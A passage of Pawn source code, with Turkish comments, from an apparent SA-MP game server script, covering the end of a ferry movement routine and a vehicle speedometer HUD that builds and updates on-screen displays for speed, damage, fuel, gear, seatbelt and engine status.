    AttachObjectToObject(FerryObject[13], ferry, -96.729, 12.9458, 12.14239,   0.0, 0.0, 269.96811, 1);
    AttachObjectToObject(FerryObject[14], ferry, -79.11743, 12.9375, 12.14239,   0.0, 0.0, 269.96811, 1);
    AttachObjectToObject(FerryObject[15], ferry, -33.32837, 12.94824, 12.14239,   0.0, 0.0, 269.96811, 1);
    AttachObjectToObject(FerryObject[16], ferry, -7.70507, 12.94043, 12.14239,   0.0, 0.0, 269.96811, 1);
    AttachObjectToObject(FerryObject[17], ferry,17.89649, 12.92139, 12.14239,   0.0, 0.0, 269.96811, 1);
    AttachObjectToObject(FerryObject[18], ferry, 43.51416, 12.91504, 12.14239,   0.0, 0.0, 269.96811, 1);
    AttachObjectToObject(FerryObject[19], ferry, 69.13379, 12.89844, 12.14239,   0.0, 0.0, 269.96811, 1);
    AttachObjectToObject(FerryObject[20], ferry,-109.4729, 6.56567, 12.07699,   0.0, 0.0, 0.0, 1);
    AttachObjectToObject(FerryObject[21], ferry, -109.45507, -6.51929, 12.07699,   0.0, 0.0, 0.0, 1);
    AttachObjectToObject(FerryObject[22], ferry,-8.09399, 12.89746,  6.28481,   0.0, 0.0, -90.00000, 1);
    AttachObjectToObject(FerryObject[23], ferry, 10.54663, -2.04565, 13.15169,   0.0, 0.0, -90.00000, 1);
    AttachObjectToObject(FerryObject[24], ferry, -63.89331, 14.31714, 6.39509,   0.0, 0.0, 89.22000, 1);
    AttachObjectToObject(FerryObject[25], ferry,33.29151, 13.99341, 6.87509,  0.0, 0.0, 89.00000, 1);
    AttachObjectToObject(FerryObject[26], ferry, -49.65649, 14.12353, 6.39509,   0.0, 0.0, 89.22000, 1);
    AttachObjectToObject(FerryObject[27], ferry, -56.79248, 14.20996, 6.39509,   0.0, 0.0, 89.22000, 1);
    AttachObjectToObject(FerryObject[28], ferry,22.6626, -13.89819, 6.56579,   0.0, 0.0, 89.88000, 1);
   	SendClientMessage(playerid, 0xFF000000,"Feribot þehire geri dönüyor.");
	SetTimer("FerryLS", 120000, 0);
	return 0;
}

public FerryLS(playerid)
{
    MoveObject(ferry,3852.02222, -2291.66577, -0.01940, 11.0,   0.00000, 0.00000, 0.00000);
    PlayerPlaySound(playerid, 1153, 2650.21191, -2291.62915, -0.03891);
    ferryI = 0;
    return 1;
}

// ************************************************************************************************************************************************************
// SpeedoMeter Sistemi [ EvoturK ] [ Yeni Speedo ]
// ************************************************************************************************************************************************************
// LoadPlayerSpeedo
LoadPlayerSpeedo(playerid)
{

	// KM BOX kutusu arkaplan siyah
	Speedo_Name1[playerid] = CreatePlayerTextDraw(playerid,212.000000, 358.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Speedo_Name1[playerid], 53);
	PlayerTextDrawFont(playerid,Speedo_Name1[playerid], 2);
	PlayerTextDrawLetterSize(playerid,Speedo_Name1[playerid], 0.683332, 5.699985);
	PlayerTextDrawColor(playerid,Speedo_Name1[playerid], -1);
	PlayerTextDrawTextSize(playerid,Speedo_Name1[playerid], 300.500000, 123.000000);
	PlayerTextDrawSetOutline(playerid,Speedo_Name1[playerid], 1);
	PlayerTextDrawSetProportional(playerid,Speedo_Name1[playerid], 1);
	PlayerTextDrawSetShadow(playerid,Speedo_Name1[playerid], 0);
	PlayerTextDrawSetSelectable(playerid,Speedo_Name1[playerid], 0);
	PlayerTextDrawBoxColor(playerid,Speedo_Name1[playerid], 93);
	PlayerTextDrawUseBox(playerid,Speedo_Name1[playerid], 1);
	PlayerTextDrawAlignment(playerid,Speedo_Name1[playerid], 2);
	
// vites çizgi
	Speedo_vciz[playerid] = CreatePlayerTextDraw(playerid,259.000000, 389.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Speedo_vciz[playerid], 255);
	PlayerTextDrawFont(playerid,Speedo_vciz[playerid], 1);
	PlayerTextDrawLetterSize(playerid,Speedo_vciz[playerid], 0.600000, -0.250018);
	PlayerTextDrawColor(playerid,Speedo_vciz[playerid], -1);
	PlayerTextDrawTextSize(playerid,Speedo_vciz[playerid], 277.500000, 26.500000);
	PlayerTextDrawSetOutline(playerid,Speedo_vciz[playerid], 3);
	PlayerTextDrawSetProportional(playerid,Speedo_vciz[playerid], 1);
	PlayerTextDrawSetShadow(playerid,Speedo_vciz[playerid], 0);
	PlayerTextDrawSetSelectable(playerid,Speedo_vciz[playerid], 0);
	PlayerTextDrawBoxColor(playerid,Speedo_vciz[playerid], 93);
	PlayerTextDrawUseBox(playerid,Speedo_vciz[playerid], 1);
	PlayerTextDrawAlignment(playerid,Speedo_vciz[playerid], 2);
	PlayerTextDrawBoxColor(playerid,Speedo_vciz[playerid], 1687547271);

// kenar 1 ALT
	Speedo_a1[playerid] = CreatePlayerTextDraw(playerid,212.000000, 356.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Speedo_a1[playerid], 255);
	PlayerTextDrawFont(playerid,Speedo_a1[playerid], 1);
	PlayerTextDrawLetterSize(playerid,Speedo_a1[playerid], 0.600000, -0.250018);
	PlayerTextDrawColor(playerid,Speedo_a1[playerid], -1);
	PlayerTextDrawTextSize(playerid,Speedo_a1[playerid], 296.000000, 124.000000);
	PlayerTextDrawSetOutline(playerid,Speedo_a1[playerid], 3);
	PlayerTextDrawSetProportional(playerid,Speedo_a1[playerid], 1);
	PlayerTextDrawSetShadow(playerid,Speedo_a1[playerid], 0);
	PlayerTextDrawSetSelectable(playerid,Speedo_a1[playerid], 0);
	PlayerTextDrawBoxColor(playerid,Speedo_a1[playerid], 93);
	PlayerTextDrawUseBox(playerid,Speedo_a1[playerid], 1);
	PlayerTextDrawAlignment(playerid,Speedo_a1[playerid], 2);
	PlayerTextDrawBoxColor(playerid,Speedo_a1[playerid], 1687547271);


//kenar2  ALT
	Speedo_a2[playerid] = CreatePlayerTextDraw(playerid,212.000000, 412.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Speedo_a2[playerid], 255);
	PlayerTextDrawFont(playerid,Speedo_a2[playerid], 1);
	PlayerTextDrawLetterSize(playerid,Speedo_a2[playerid], 0.600000, -0.250018);
	PlayerTextDrawColor(playerid,Speedo_a2[playerid], -1);
	PlayerTextDrawTextSize(playerid,Speedo_a2[playerid], 296.000000, 124.000000);
	PlayerTextDrawSetOutline(playerid,Speedo_a2[playerid], 3);
	PlayerTextDrawSetProportional(playerid,Speedo_a2[playerid], 1);
	PlayerTextDrawSetShadow(playerid,Speedo_a2[playerid], 0);
	PlayerTextDrawSetSelectable(playerid,Speedo_a2[playerid], 0);
	PlayerTextDrawBoxColor(playerid,Speedo_a2[playerid], 93);
	PlayerTextDrawUseBox(playerid,Speedo_a2[playerid], 1);
	PlayerTextDrawAlignment(playerid,Speedo_a2[playerid], 2);
	PlayerTextDrawBoxColor(playerid,Speedo_a2[playerid], 1687547271);
	
//kenar3 kenar

	Speedo_a3[playerid] = CreatePlayerTextDraw(playerid,276.000000, 356.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Speedo_a3[playerid], 255);
	PlayerTextDrawFont(playerid,Speedo_a3[playerid], 1);
	PlayerTextDrawLetterSize(playerid,Speedo_a3[playerid], 0.600000, 5.949985);
	PlayerTextDrawColor(playerid,Speedo_a3[playerid], -1);
	PlayerTextDrawTextSize(playerid,Speedo_a3[playerid], 288.000000, -2.500000);
	PlayerTextDrawSetOutline(playerid,Speedo_a3[playerid], 3);
	PlayerTextDrawSetProportional(playerid,Speedo_a3[playerid], 1);
	PlayerTextDrawSetShadow(playerid,Speedo_a3[playerid], 0);
	PlayerTextDrawSetSelectable(playerid,Speedo_a3[playerid], 0);
	PlayerTextDrawBoxColor(playerid,Speedo_a3[playerid], 93);
	PlayerTextDrawUseBox(playerid,Speedo_a3[playerid], 1);
	PlayerTextDrawAlignment(playerid,Speedo_a3[playerid], 2);
	PlayerTextDrawBoxColor(playerid,Speedo_a3[playerid], 1687547271);
	
	
//KENAR 4 YAN

	Speedo_a4[playerid] = CreatePlayerTextDraw(playerid,148.000000, 356.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Speedo_a4[playerid], 255);
	PlayerTextDrawFont(playerid,Speedo_a4[playerid], 1);
	PlayerTextDrawLetterSize(playerid,Speedo_a4[playerid], 0.600000, 5.949985);
	PlayerTextDrawColor(playerid,Speedo_a4[playerid], -1);
	PlayerTextDrawTextSize(playerid,Speedo_a4[playerid], 288.000000, -2.500000);
	PlayerTextDrawSetOutline(playerid,Speedo_a4[playerid], 3);
	PlayerTextDrawSetProportional(playerid,Speedo_a4[playerid], 1);
	PlayerTextDrawSetShadow(playerid,Speedo_a4[playerid], 0);
	PlayerTextDrawSetSelectable(playerid,Speedo_a4[playerid], 0);
	PlayerTextDrawBoxColor(playerid,Speedo_a4[playerid], 93);
	PlayerTextDrawUseBox(playerid,Speedo_a4[playerid], 1);
	PlayerTextDrawAlignment(playerid,Speedo_a4[playerid], 2);
	PlayerTextDrawBoxColor(playerid,Speedo_a4[playerid], 1687547271);


	// petrol kutu box obje
	Speedo_petrol[playerid] = CreatePlayerTextDraw(playerid,139.000000, 367.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Speedo_petrol[playerid], 0);
	PlayerTextDrawFont(playerid,Speedo_petrol[playerid], 5);
	PlayerTextDrawLetterSize(playerid,Speedo_petrol[playerid], 0.600000, 2.000000);
	PlayerTextDrawColor(playerid,Speedo_petrol[playerid], -1);
	PlayerTextDrawTextSize(playerid,Speedo_petrol[playerid], 44.000000, 34.500000);
	PlayerTextDrawSetOutline(playerid,Speedo_petrol[playerid], 0);
	PlayerTextDrawSetProportional(playerid,Speedo_petrol[playerid], 1);
	PlayerTextDrawSetShadow(playerid,Speedo_petrol[playerid], 0);
	PlayerTextDrawSetSelectable(playerid,Speedo_petrol[playerid], 0);
	PlayerTextDrawBoxColor(playerid,Speedo_petrol[playerid], -256);
	PlayerTextDrawUseBox(playerid,Speedo_petrol[playerid], 1);
	PlayerTextDrawAlignment(playerid,Speedo_petrol[playerid], 2);
	PlayerTextDrawSetPreviewModel(playerid,Speedo_petrol[playerid], 1650);
	PlayerTextDrawSetPreviewRot(playerid,Speedo_petrol[playerid], -10.000000, 0.000000, 0.000000, 0.970000);
	PlayerTextDrawSetPreviewVehCol(playerid,Speedo_petrol[playerid], 1, 1);
	
		// tamir kutu box obje
	Speedo_fix[playerid] = CreatePlayerTextDraw(playerid,176.000000, 362.000000, "Tamir obje");
	PlayerTextDrawBackgroundColor(playerid,Speedo_fix[playerid], 0);
	PlayerTextDrawFont(playerid,Speedo_fix[playerid], 5);
	PlayerTextDrawLetterSize(playerid,Speedo_fix[playerid], 0.600000, 2.000000);
	PlayerTextDrawColor(playerid,Speedo_fix[playerid], -1);
	PlayerTextDrawTextSize(playerid,Speedo_fix[playerid], 32.000000, 53.000000);
	PlayerTextDrawSetOutline(playerid,Speedo_fix[playerid], 0);
	PlayerTextDrawSetProportional(playerid,Speedo_fix[playerid], 1);
	PlayerTextDrawSetShadow(playerid,Speedo_fix[playerid], 0);
	PlayerTextDrawSetSelectable(playerid,Speedo_fix[playerid], 0);
	PlayerTextDrawBoxColor(playerid,Speedo_fix[playerid], -256);
	PlayerTextDrawUseBox(playerid,Speedo_fix[playerid], 1);
	PlayerTextDrawAlignment(playerid,Speedo_fix[playerid], 2);
	PlayerTextDrawSetPreviewModel(playerid,Speedo_fix[playerid], 19627);
	PlayerTextDrawSetPreviewRot(playerid,Speedo_fix[playerid], -100.000000, 0.000000, 0.000000, 0.800000);
	PlayerTextDrawSetPreviewVehCol(playerid,Speedo_fix[playerid], 1, 1);


	// jant kutu box obje
	Speedo_jant[playerid] = CreatePlayerTextDraw(playerid,201.000000, 366.000000, "Tamir obje");
	PlayerTextDrawBackgroundColor(playerid,Speedo_jant[playerid], 0);
	PlayerTextDrawFont(playerid,Speedo_jant[playerid], 5);
	PlayerTextDrawLetterSize(playerid,Speedo_jant[playerid], 0.600000, 2.000000);
	PlayerTextDrawColor(playerid,Speedo_jant[playerid], -1);
	PlayerTextDrawTextSize(playerid,Speedo_jant[playerid], 46.500000, 40.500000);
	PlayerTextDrawSetOutline(playerid,Speedo_jant[playerid], 0);
	PlayerTextDrawSetProportional(playerid,Speedo_jant[playerid], 1);
	PlayerTextDrawSetShadow(playerid,Speedo_jant[playerid], 0);
	PlayerTextDrawSetSelectable(playerid,Speedo_jant[playerid], 0);
	PlayerTextDrawBoxColor(playerid,Speedo_jant[playerid], -256);
	PlayerTextDrawUseBox(playerid,Speedo_jant[playerid], 1);
	PlayerTextDrawAlignment(playerid,Speedo_jant[playerid], 2);
	PlayerTextDrawSetPreviewModel(playerid,Speedo_jant[playerid], 1081);
	PlayerTextDrawSetPreviewRot(playerid,Speedo_jant[playerid], -10.000000, 0.000000, 87.000000, 1.289999);
	PlayerTextDrawSetPreviewVehCol(playerid,Speedo_jant[playerid], 1, 1);

//araç isim tamam
	Speedo_Name[playerid] = CreatePlayerTextDraw(playerid,213.000000, 359.000000, "ROADTRAIN");
	PlayerTextDrawLetterSize(playerid,Speedo_Name[playerid], 0.183330, 1.049998);
	PlayerTextDrawTextSize(playerid,Speedo_Name[playerid], 264.500000, 14.500000);
	PlayerTextDrawBackgroundColor(playerid,Speedo_Name[playerid], 176);
	PlayerTextDrawFont(playerid,Speedo_Name[playerid], 1);
	PlayerTextDrawColor(playerid,Speedo_Name[playerid], -1);
	PlayerTextDrawSetOutline(playerid,Speedo_Name[playerid], 0);
	PlayerTextDrawSetProportional(playerid,Speedo_Name[playerid], 1);
	PlayerTextDrawSetShadow(playerid,Speedo_Name[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,Speedo_Name[playerid], 0);


   //hýz göstrgesi tamam
	Speedo_Speed[playerid] = CreatePlayerTextDraw(playerid,223.000000, 380.000000, "300");
	PlayerTextDrawBackgroundColor(playerid,Speedo_Speed[playerid], 176);
	PlayerTextDrawFont(playerid,Speedo_Speed[playerid], 2);
	PlayerTextDrawLetterSize(playerid,Speedo_Speed[playerid], 0.229166, 1.299998);
	PlayerTextDrawTextSize(playerid, Speedo_Speed[playerid], 264.500000, 14.500000);
	PlayerTextDrawColor(playerid,Speedo_Speed[playerid], -1);
	PlayerTextDrawSetOutline(playerid,Speedo_Speed[playerid], 1);
	PlayerTextDrawSetShadow(playerid, Speedo_Speed[playerid], 0);
	PlayerTextDrawAlignment(playerid, Speedo_Speed[playerid], 1);
	PlayerTextDrawSetProportional(playerid,Speedo_Speed[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,Speedo_Speed[playerid], 0);

	
//arac saglýk tamam
    Speedo_Damage[playerid] = CreatePlayerTextDraw(playerid,192.000000, 376.000000, "100");
	PlayerTextDrawBackgroundColor(playerid,Speedo_Damage[playerid], 255);
	PlayerTextDrawFont(playerid,Speedo_Damage[playerid], 1);
	PlayerTextDrawLetterSize(playerid,Speedo_Damage[playerid], 0.195831, 0.899998);
	PlayerTextDrawTextSize(playerid, Speedo_Damage[playerid], 400.000000, 17.000000);
	PlayerTextDrawColor(playerid,Speedo_Damage[playerid], -1);
	PlayerTextDrawSetOutline(playerid,Speedo_Damage[playerid], 1);
	PlayerTextDrawSetShadow(playerid, Speedo_Damage[playerid], 1);
	PlayerTextDrawAlignment(playerid, Speedo_Damage[playerid], 2);
	PlayerTextDrawSetProportional(playerid,Speedo_Damage[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,Speedo_Damage[playerid], 0);
	

// petrol tamam
	Speedo_Fuel[playerid] = CreatePlayerTextDraw(playerid,162.000000, 380.000000, "100");
	PlayerTextDrawBackgroundColor(playerid,Speedo_Fuel[playerid], 255);
	PlayerTextDrawFont(playerid,Speedo_Fuel[playerid], 1);
	PlayerTextDrawLetterSize(playerid,Speedo_Fuel[playerid], 0.179166, 1.049998);
	PlayerTextDrawTextSize(playerid, Speedo_Fuel[playerid], 400.000000, 17.000000);
	PlayerTextDrawColor(playerid,Speedo_Fuel[playerid], -1);
	PlayerTextDrawSetOutline(playerid,Speedo_Fuel[playerid], 1);
	PlayerTextDrawSetShadow(playerid, Speedo_Fuel[playerid], 1);
	PlayerTextDrawBoxColor(playerid, Speedo_Fuel[playerid], 50);
	PlayerTextDrawAlignment(playerid, Speedo_Fuel[playerid], 2);
	PlayerTextDrawSetProportional(playerid,Speedo_Fuel[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,Speedo_Fuel[playerid], 0);


	Speedo_Vites[playerid] = CreatePlayerTextDraw(playerid,147.000000, 401.000000, "VITES ~b~~h~1 ~w~2 3 4 5");
	PlayerTextDrawBackgroundColor(playerid,Speedo_Vites[playerid], 255);
	PlayerTextDrawFont(playerid,Speedo_Vites[playerid], 2);
	PlayerTextDrawLetterSize(playerid,Speedo_Vites[playerid], 0.219999, 1.000000);
	PlayerTextDrawColor(playerid,Speedo_Vites[playerid], -1);
	PlayerTextDrawSetOutline(playerid,Speedo_Vites[playerid], 0);
	PlayerTextDrawSetProportional(playerid,Speedo_Vites[playerid], 1);
	PlayerTextDrawSetShadow(playerid,Speedo_Vites[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,Speedo_Vites[playerid], 0);
	
	Speedo_Motor[playerid] = CreatePlayerTextDraw(playerid,181.000000, 358.000000, "MOTOR");
	PlayerTextDrawLetterSize(playerid,Speedo_Motor[playerid], 0.204164, 1.100000);
	PlayerTextDrawTextSize(playerid,Speedo_Motor[playerid], 400.000000, 17.000000);
	PlayerTextDrawBackgroundColor(playerid,Speedo_Motor[playerid], 176);
	PlayerTextDrawFont(playerid,Speedo_Motor[playerid], 1);
	PlayerTextDrawColor(playerid,Speedo_Motor[playerid], -1);
	PlayerTextDrawSetOutline(playerid,Speedo_Motor[playerid], 0);
	PlayerTextDrawSetProportional(playerid,Speedo_Motor[playerid], 1);
	PlayerTextDrawSetShadow(playerid,Speedo_Motor[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,Speedo_Motor[playerid], 0);
	
	//kemer kask text
	//araç isim tamam
	Speedo_kemer[playerid] = CreatePlayerTextDraw(playerid,152.000000, 358.000000, "KEMER");
	PlayerTextDrawLetterSize(playerid,Speedo_kemer[playerid], 0.204164, 1.100000);
	PlayerTextDrawTextSize(playerid,Speedo_kemer[playerid], 400.000000, 17.000000);
	PlayerTextDrawBackgroundColor(playerid,Speedo_kemer[playerid], 176);
	PlayerTextDrawFont(playerid,Speedo_kemer[playerid], 1);
	PlayerTextDrawColor(playerid,Speedo_kemer[playerid], -1);
	PlayerTextDrawSetOutline(playerid,Speedo_kemer[playerid], 0);
	PlayerTextDrawSetProportional(playerid,Speedo_kemer[playerid], 1);
	PlayerTextDrawSetShadow(playerid,Speedo_kemer[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,Speedo_kemer[playerid], 0);

	return 1;
}

// LoadSpeedo
LoadSpeedo()
{//km tamam
	Speedo_Text[0] = TextDrawCreate(215.000000, 399.000000, "KM/H");
	TextDrawBackgroundColor(Speedo_Text[0], 255);
	TextDrawFont(Speedo_Text[0], 1);
	TextDrawTextSize(Speedo_Text[0], 264.500000, 14.500000);
	TextDrawLetterSize(Speedo_Text[0], 0.224996, 0.949998);
	TextDrawColor(Speedo_Text[0], -1);
	TextDrawSetOutline(Speedo_Text[0], 0);
	TextDrawSetProportional(Speedo_Text[0], 1);
	TextDrawSetShadow(Speedo_Text[0], 1);
	TextDrawSetSelectable(Speedo_Text[0], 0);
	

	Speedo_Text[1] = TextDrawCreate(183.000000, 379.000000, "");
	TextDrawBackgroundColor(Speedo_Text[1], 255);
	TextDrawFont(Speedo_Text[1], 1);
	TextDrawLetterSize(Speedo_Text[1], 0.270000, 1.000000);
	TextDrawColor(Speedo_Text[1], -1);
	TextDrawSetOutline(Speedo_Text[1], 0);
	TextDrawSetProportional(Speedo_Text[1], 1);
	TextDrawSetShadow(Speedo_Text[1], 1);
	TextDrawSetSelectable(Speedo_Text[1], 0);
//hasar tamam
	Speedo_Text[2] = TextDrawCreate(181.000000, 396.000000, "HASAR");
	TextDrawBackgroundColor(Speedo_Text[2], 255);
	TextDrawFont(Speedo_Text[2], 1);
	TextDrawTextSize(Speedo_Text[2], 264.500000, 14.500000);
	TextDrawLetterSize(Speedo_Text[2], 0.224996, 0.949998);
	TextDrawColor(Speedo_Text[2], -1);
	TextDrawSetOutline(Speedo_Text[2], 0);
	TextDrawSetProportional(Speedo_Text[2], 1);
	TextDrawSetShadow(Speedo_Text[2], 1);
	TextDrawSetSelectable(Speedo_Text[2], 0);

	Speedo_Text[3] = TextDrawCreate(234.000000, 379.000000, "");
	TextDrawBackgroundColor(Speedo_Text[3], 255);
	TextDrawFont(Speedo_Text[3], 1);
	TextDrawLetterSize(Speedo_Text[3], 0.270000, 1.000000);
	TextDrawColor(Speedo_Text[3], -1);
	TextDrawSetOutline(Speedo_Text[3], 0);
	TextDrawSetProportional(Speedo_Text[3], 1);
	TextDrawSetShadow(Speedo_Text[3], 1);
	TextDrawSetSelectable(Speedo_Text[3], 0);
// yakýt tamam
	Speedo_Text[4] = TextDrawCreate(150.000000, 396.000000, "YAKIT");
	TextDrawBackgroundColor(Speedo_Text[4], 255);
	TextDrawFont(Speedo_Text[4], 1);
	TextDrawTextSize(Speedo_Text[4], 264.500000, 14.500000);
	TextDrawLetterSize(Speedo_Text[4], 0.224996, 0.949998);
	TextDrawColor(Speedo_Text[4], -1);
	TextDrawSetOutline(Speedo_Text[4], 0);
	TextDrawSetProportional(Speedo_Text[4], 1);
	TextDrawSetShadow(Speedo_Text[4], 1);
	TextDrawSetSelectable(Speedo_Text[4], 0);
	
	return 1;
}

// ShowPlayerSpeedo
ShowPlayerSpeedo(playerid)
{
	PlayerTextDrawShow(playerid, Speedo_Name[playerid]);
	PlayerTextDrawShow(playerid, Speedo_Name1[playerid]);
	PlayerTextDrawShow(playerid, Speedo_a1[playerid]);
	PlayerTextDrawShow(playerid, Speedo_a2[playerid]);
	PlayerTextDrawShow(playerid, Speedo_a3[playerid]);
	PlayerTextDrawShow(playerid, Speedo_a4[playerid]);
	PlayerTextDrawShow(playerid, Speedo_a5[playerid]);
	PlayerTextDrawShow(playerid, Speedo_petrol[playerid]);
	PlayerTextDrawShow(playerid, Speedo_jant[playerid]);
	PlayerTextDrawShow(playerid, Speedo_vciz[playerid]);
	PlayerTextDrawShow(playerid, Speedo_fix[playerid]);
	PlayerTextDrawShow(playerid, Speedo_kemer[playerid]);
	PlayerTextDrawShow(playerid, Speedo_Speed[playerid]);
	PlayerTextDrawShow(playerid, Speedo_Damage[playerid]);
	PlayerTextDrawShow(playerid, Speedo_Fuel[playerid]);
	for(new i; i < 5; i++) TextDrawShowForPlayer(playerid, Speedo_Text[i]);
	PlayerTextDrawShow(playerid, Speedo_Vites[playerid]);
	PlayerTextDrawShow(playerid, Speedo_Motor[playerid]);
	
}

// HidePlayerSpeedo
HidePlayerSpeedo(playerid)
{
	PlayerTextDrawHide(playerid, Speedo_Name[playerid]);
	PlayerTextDrawHide(playerid, Speedo_Name1[playerid]);
	PlayerTextDrawHide(playerid, Speedo_a1[playerid]);
    PlayerTextDrawHide(playerid, Speedo_a2[playerid]);
    PlayerTextDrawHide(playerid, Speedo_a3[playerid]);
    PlayerTextDrawHide(playerid, Speedo_vciz[playerid]);
    PlayerTextDrawHide(playerid, Speedo_a4[playerid]);
    PlayerTextDrawHide(playerid, Speedo_a5[playerid]);
	PlayerTextDrawHide(playerid, Speedo_petrol[playerid]);
	PlayerTextDrawHide(playerid, Speedo_jant[playerid]);
	PlayerTextDrawHide(playerid, Speedo_fix[playerid]);
	PlayerTextDrawHide(playerid, Speedo_kemer[playerid]);
	PlayerTextDrawHide(playerid, Speedo_Speed[playerid]);
	PlayerTextDrawHide(playerid, Speedo_Damage[playerid]);
	PlayerTextDrawHide(playerid, Speedo_Fuel[playerid]);
	for(new i; i < 5; i++) TextDrawHideForPlayer(playerid, Speedo_Text[i]);
	PlayerTextDrawHide(playerid, Speedo_Vites[playerid]);
	PlayerTextDrawHide(playerid, Speedo_Motor[playerid]);
}

forward UpdatePlayerSpeedo(playerid);
public UpdatePlayerSpeedo(playerid)
{
	if(APlayerData[playerid][Spectating] == true)
	{
	    if(GetPlayerState(APlayerData[playerid][SpectateID]) == PLAYER_STATE_DRIVER)
	    {
			new
				Speedo_Yazi[80],
				Float:speed_x,
				Float:speed_y,
				Float:speed_z,
				Float:Speedo_SpeedT;
 			GetVehicleVelocity(GetPlayerVehicleID(APlayerData[playerid][SpectateID]), speed_x, speed_y, speed_z);
			Speedo_SpeedT = floatsqroot(((speed_x * speed_x) + (speed_y * speed_y)) + (speed_z * speed_z)) * 158.179;
			format(Speedo_Yazi, 80, "%d", floatround(Speedo_SpeedT));
			PlayerTextDrawSetString(playerid, Speedo_Speed[playerid], Speedo_Yazi);
	    }
	    return 1;
	}

	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && TextKapat[playerid] == 0)
	{
		new
			Speedo_Yazi[80],
			Speedo_TeaMStar[80],
			Float:speed_x,
			Float:speed_y,
			Float:speed_z,
			Float:Speedo_SpeedT,
			Float:Speedo_DamageT,
			Float:Speedo_DamageT2,
			Float:Speedo_BenzinT;

		GetVehicleVelocity(GetPlayerVehicleID(playerid), speed_x, speed_y, speed_z);
		Speedo_SpeedT = floatsqroot(((speed_x * speed_x) + (speed_y * speed_y)) + (speed_z * speed_z)) * 158.179;

		format(Speedo_Yazi, 80, "%d", floatround(Speedo_SpeedT));
		PlayerTextDrawSetString(playerid, Speedo_Speed[playerid], Speedo_Yazi);

		GetVehicleHealth(GetPlayerVehicleID(playerid), Speedo_DamageT);
		Speedo_DamageT2 = (1000.0 - Speedo_DamageT) * 0.1;

		if(Speedo_DamageT > 750.0)
		{
			format(Speedo_Yazi, 80, "~w~~h~~h~%d", floatround(Speedo_DamageT2));
		}

		if(Speedo_DamageT > 250.0 && Speedo_DamageT < 750.0)
		{
			format(Speedo_Yazi, 80, "~y~%d", floatround(Speedo_DamageT2));
		}

		if(Speedo_DamageT < 250.0)
		{
			format(Speedo_Yazi, 80, "~r~%d", floatround(Speedo_DamageT2));
		}

        PlayerTextDrawSetString(playerid, Speedo_Damage[playerid], Speedo_Yazi);
        Speedo_BenzinT = floatround(AVehicleData[ GetPlayerVehicleID(playerid) ][Fuel] * 0.033333); // 0.041666 MaxFuel 2400 için
        format(Speedo_Yazi,80, "%d", floatround(Speedo_BenzinT));
        PlayerTextDrawSetString(playerid, Speedo_Fuel[playerid], Speedo_Yazi);
		if(otovites[playerid] == 0)
		{
		    switch(PlayerGear[playerid])
		    {
		        case 1: format(Speedo_Yazi, 80, "%s  ~p~~h~~h~VITES ~b~1  ~p~~h~~h~2  3  4  5", Speedo_Yazi);
		        case 2: format(Speedo_Yazi, 80, "%s  ~p~~h~~h~VITES 1  ~b~2  ~p~~h~~h~3  4  5", Speedo_Yazi);
		        case 3: format(Speedo_Yazi, 80, "%s  ~p~~h~~h~VITES 1  2  ~b~3  ~p~~h~~h~4  5", Speedo_Yazi);
		        case 4: format(Speedo_Yazi, 80, "%s  ~p~~h~~h~VITES 1  2  3  ~b~4  ~p~~h~~h~5", Speedo_Yazi);
		        case 5: format(Speedo_Yazi, 80, "%s  ~p~~h~~h~VITES 1  2  3  4  ~b~5", Speedo_Yazi);
		    }
		}
		PlayerTextDrawSetString(playerid, Speedo_Vites[playerid], Speedo_Yazi);
  		if(IsAMotorBike(GetPlayerVehicleID(playerid)))
		{
		    switch(SeatbeltStatus[playerid])
		    {
		        case 0: format(Speedo_TeaMStar, 80, "~w~~h~KASK");
		        case 1: format(Speedo_TeaMStar, 80, "~g~~h~~h~KASK");
		    }
		}else{
		    switch(SeatbeltStatus[playerid])
		    {
		        case 0: format(Speedo_TeaMStar, 80, "~w~~h~KEMER");
		        case 1: format(Speedo_TeaMStar, 80, "~g~~h~~h~KEMER");
		    }
		    PlayerTextDrawSetString(playerid, Speedo_kemer[playerid], Speedo_TeaMStar);
		}
        if(Araclar[ GetPlayerVehicleID(playerid) ][AracInSHP] == true)
        {
            new id = GetPlayerVehicleID(playerid);
			new txtbea[128];
            format(txtbea, 80, "%s - %.2f KM",VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], AracSHP[Araclar[id][AracSHPID]][KM]);
			PlayerTextDrawSetString(playerid, Speedo_Name[playerid], txtbea);
		}
        if(Araclar[ GetPlayerVehicleID(playerid) ][AracInSHP] == false)
		{
			new txtbea[128];
            format(txtbea, 80, "%s - X KM",VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ]);
			PlayerTextDrawSetString(playerid, Speedo_Name[playerid], txtbea);
		}

        switch(MotorMOD[GetPlayerVehicleID(playerid)])
        {
        	case 0: format(Speedo_Yazi, 80, "~w~~h~MOTOR");
        	case 1: format(Speedo_Yazi, 80, "~g~~h~~h~MOTOR");
		}
		PlayerTextDrawSetString(playerid, Speedo_Motor[playerid], Speedo_Yazi);
		}
	return 1;
}
/*
forward UpdatePlayerSpeedo(playerid);
public UpdatePlayerSpeedo(playerid)
{
	if(!IsPlayerConnected(playerid)) { StopSpeedoTimer(playerid); return 1; }

	if(MagaraAdami[playerid] == 1) return 1;

	if(APlayerData[playerid][Spectating] == true)
	{
	    if(GetPlayerState(APlayerData[playerid][SpectateID]) == PLAYER_STATE_DRIVER)
	    {
			new
				Speedo_Yazi[80],
				Float:speed_x,
				Float:speed_y,
				Float:speed_z,
				Float:Speedo_SpeedT;
 			GetVehicleVelocity(GetPlayerVehicleID(APlayerData[playerid][SpectateID]), speed_x, speed_y, speed_z);
			Speedo_SpeedT = floatsqroot(((speed_x * speed_x) + (speed_y * speed_y)) + (speed_z * speed_z)) * 158.179;
			format(Speedo_Yazi, 80, "%d KM/H", floatround(Speedo_SpeedT));
